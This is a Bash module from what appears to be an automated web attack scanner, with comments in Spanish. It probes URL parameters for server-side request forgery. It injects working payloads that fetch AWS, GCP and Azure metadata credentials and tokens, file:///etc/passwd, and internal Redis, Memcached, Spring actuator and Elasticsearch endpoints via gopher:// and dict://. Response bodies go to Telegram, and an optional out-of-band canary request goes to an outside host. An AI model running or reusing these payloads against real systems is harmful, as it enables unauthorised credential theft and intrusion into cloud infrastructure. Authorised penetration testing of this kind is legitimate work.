#!/usr/bin/env bash
# ============================================================
#  modules/47_ssrf_deep.sh — Tier 3.1 SSRF deep
#
#  Vectores:
#    1. Cloud metadata SSRF (AWS 169.254.169.254, GCP, Azure IMDS)
#    2. Protocol smuggling (file://, gopher://, dict://, ldap://)
#    3. Internal port scan (localhost:6379, :11211, :27017, :5432, :3306)
#    4. OOB canary (opt-in SSRF_CANARY)
#  Anti-FP: response debe contener marker específico del servicio interno.
# ============================================================

MODULE_NAME="ssrf_deep"
MODULE_DESC="SSRF — cloud metadata + protocol smuggling + internal port scan"

_ssrf_finding() {
  db_add_finding "$1" "ssrf" "$5" "$3" "$4" "$6" "${7:-medium}" 2>/dev/null
  log_warn "  ⚡ [$5/${7:-medium}] SSRF $4: $3"
  if [[ "${7:-medium}" != "low" ]] && [[ "$5" == "critical" || "$5" == "high" ]]; then
    _telegram_send "🔴 *SSRF — $4*
🌐 \`$2\`
🔗 \`$3\`
📋 ${6:0:280}
📊 \`${5^^}\` / \`${7:-medium}\`" 2>/dev/null || true
  fi
}

_ssrf_probe() {
  local URL="$1" PARAM="$2" DOMAIN_ID="$3" DOMAIN="$4"
  local BASE="${URL%%\?*}"

  # Cloud metadata payloads + markers
  declare -A PAYLOADS=(
    ["http://169.254.169.254/latest/meta-data/iam/security-credentials/"]="AccessKeyId|SecretAccessKey|InstanceProfileArn"
    ["http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"]="access_token|expires_in"
    ["http://169.254.169.254/metadata/instance?api-version=2021-02-01"]="\"compute\":|\"vmId\":"
    ["file:///etc/passwd"]="root:x:0:0:|/bin/bash"
    ["gopher://localhost:6379/_INFO"]="redis_version|tcp_port"
    ["dict://localhost:11211/stats"]="STAT pid|STAT uptime"
    ["http://localhost:8080/actuator/env"]="\"propertySources\":|\"systemProperties\":"
    ["http://localhost:9200/_cluster/health"]="\"cluster_name\":|\"status\":"
  )

  for PAYLOAD in "${!PAYLOADS[@]}"; do
    local MARKER="${PAYLOADS[$PAYLOAD]}"
    local TEST_URL
    TEST_URL=$(echo "$URL" | python3 -c "
import sys, urllib.parse as u
url=sys.stdin.read().strip()
parts=u.urlparse(url); q=u.parse_qsl(parts.query, keep_blank_values=True)
q=[(k,'$PAYLOAD' if k=='$PARAM' else v) for k,v in q]
print(u.urlunparse(parts._replace(query=u.urlencode(q))))
" 2>/dev/null)
    [[ -z "$TEST_URL" ]] && continue

    _h_get_noredirect "$TEST_URL" --connect-timeout 12 \
      -H "Metadata-Flavor: Google" -H "Metadata: true"
    local STATUS="$HTTP_LAST_STATUS" BODY="${HTTP_LAST_BODY:0:5000}"
    [[ "$STATUS" != "200" ]] && continue

    if echo "$BODY" | grep -qE "$MARKER"; then
      local SEV="critical"
      [[ "$PAYLOAD" == "file://"* ]] && SEV="critical"
      _ssrf_finding "$DOMAIN_ID" "$DOMAIN" "$URL" "ssrf_param:${PARAM}" "$SEV" \
        "SSRF en param '${PARAM}' → ${PAYLOAD} responde con marker (${MARKER:0:60}). Body: ${BODY:0:200}" \
        "high"
      return 0
    fi
  done

  # OOB canary (opt-in)
  if [[ -n "${SSRF_CANARY:-}" ]]; then
    local OOB_URL="http://${SSRF_CANARY}/ssrf-${PARAM}-$(date +%s)"
    local TEST_URL
    TEST_URL=$(echo "$URL" | python3 -c "
import sys, urllib.parse as u
url=sys.stdin.read().strip()
parts=u.urlparse(url); q=u.parse_qsl(parts.query, keep_blank_values=True)
q=[(k,'$OOB_URL' if k=='$PARAM' else v) for k,v in q]
print(u.urlunparse(parts._replace(query=u.urlencode(q))))
" 2>/dev/null)
    _h_get_noredirect "$TEST_URL" --connect-timeout 8
    log_info "  SSRF OOB enviado a $SSRF_CANARY (param ${PARAM}) — verifica logs"
  fi
  return 1
}

module_run() {
  local DOMAIN="$1" DOMAIN_ID="$2" OUT_DIR="$3"
  log_phase "Módulo 47 — $MODULE_DESC: $DOMAIN"
  source "${SCRIPT_DIR}/core/http_analyzer.sh" 2>/dev/null
  source "${SCRIPT_DIR}/core/finding_validators.sh" 2>/dev/null

  local SSRF_PARAMS='url|uri|src|source|dest|destination|target|host|callback|fetch|file|page|image|imageUrl|redirect|next|return|continue|forward|proxy|webhook|feed|api'
  local CANDIDATES
  CANDIDATES=$(sqlite3 "$DB_PATH" "
    SELECT DISTINCT u.url || '|' || p.param_name FROM urls u
    JOIN url_params p ON p.url=u.url AND p.domain_id=u.domain_id
    WHERE u.domain_id=${DOMAIN_ID}
      AND p.param_name IN ('url','uri','src','source','dest','destination','target','host','callback','fetch','file','page','image','imageUrl','redirect','next','return','continue','forward','proxy','webhook','feed','api')
    LIMIT 30;" 2>/dev/null)
  if [[ -z "$CANDIDATES" ]]; then
    # Fallback sin REGEXP
    CANDIDATES=$(sqlite3 "$DB_PATH" "
      SELECT DISTINCT url FROM urls
      WHERE domain_id=${DOMAIN_ID} AND url LIKE '%?%'
      AND (url LIKE '%url=%' OR url LIKE '%uri=%' OR url LIKE '%redirect=%'
           OR url LIKE '%target=%' OR url LIKE '%fetch=%' OR url LIKE '%callback=%'
           OR url LIKE '%dest=%' OR url LIKE '%src=%' OR url LIKE '%proxy=%')
      LIMIT 30;" 2>/dev/null | sort -u)
  fi
  [[ -z "$CANDIDATES" ]] && { log_info "  Sin params SSRF candidatos"; return 0; }

  local TOTAL=0
  while IFS=$'\t|' read -r URL PARAM; do
    [[ -z "$URL" ]] && continue
    [[ -z "$PARAM" ]] && PARAM=$(echo "$URL" | grep -oE '\b(url|uri|redirect|target|fetch|callback|dest|src|proxy)\b' | head -1)
    [[ -z "$PARAM" ]] && continue
    _ssrf_probe "$URL" "$PARAM" "$DOMAIN_ID" "$DOMAIN" && ((TOTAL++))
  done <<< "$CANDIDATES"
  log_ok "$MODULE_DESC: $TOTAL SSRFs confirmados"
}
